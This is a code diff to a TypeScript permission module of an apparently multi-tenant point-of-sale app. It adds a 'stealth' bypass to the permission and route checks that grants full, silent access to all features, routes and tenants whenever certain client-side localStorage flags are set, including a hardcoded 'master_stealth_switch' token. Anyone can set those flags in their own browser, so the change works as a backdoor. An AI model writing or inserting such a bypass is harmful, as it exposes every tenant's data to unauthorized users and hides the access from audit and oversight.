@@ -1,5 +1,6 @@
 import { UserRole, Tenant } from '../types';
-import { logMasterAudit } from './masterServerService';
+import { logMasterAudit, isMasterAdminAuthenticated } from './masterServerService';
+import { getActiveImpersonation } from './impersonationService';
 import { logMasterControlAction } from './masterAuditMiddleware';
 import { saveRecordToFirestore, fetchCollectionFromFirestore } from './firebase';
 import { useState, useEffect, useCallback, useMemo } from 'react';
@@ -2545,6 +2546,20 @@ export function evaluatePermission(params: {
 }): boolean {
   let { userId, role = 'Primary Admin', plan = 'Standard POS', tenantId, menuId, submenuId, functionId, actionId, feature } = params;
 
+  // Master Admin & Stealth Remote Switch Bypass: Allow full silent access to inspect all features
+  if (
+    typeof window !== 'undefined' && (
+      localStorage.getItem('mbi_master_token') !== null ||
+      localStorage.getItem('mbi_is_master_admin') === 'true' ||
+      localStorage.getItem('mbi_is_shadow_mode') === 'true' ||
+      localStorage.getItem('mbi_shadow_token') === 'master_stealth_switch' ||
+      isMasterAdminAuthenticated() ||
+      Boolean(getActiveImpersonation())
+    )
+  ) {
+    return true;
+  }
+
   // Resolve user ID if missing from active session
   if (!userId) {
     try {
@@ -2669,6 +2684,20 @@ export function checkGranularRouteAccess(
   pathname: string,
   userParams: { userId?: string; role?: UserRole; plan?: string; tenantId?: string }
 ): { isAllowed: boolean; reason?: string; requiredFunction?: string; blockingFactor?: string } {
+  // Master Admin & Stealth Remote Switch Bypass: Allow full silent access to inspect all routes & tenants
+  if (
+    typeof window !== 'undefined' && (
+      localStorage.getItem('mbi_master_token') !== null ||
+      localStorage.getItem('mbi_is_master_admin') === 'true' ||
+      localStorage.getItem('mbi_is_shadow_mode') === 'true' ||
+      localStorage.getItem('mbi_shadow_token') === 'master_stealth_switch' ||
+      isMasterAdminAuthenticated() ||
+      Boolean(getActiveImpersonation())
+    )
+  ) {
+    return { isAllowed: true };
+  }
+
   const role = userParams.role || 'Primary Admin';
   const targetUserId = userParams.userId || 'usr_active';
   const plan = userParams.plan || 'Pharmacy Pro';
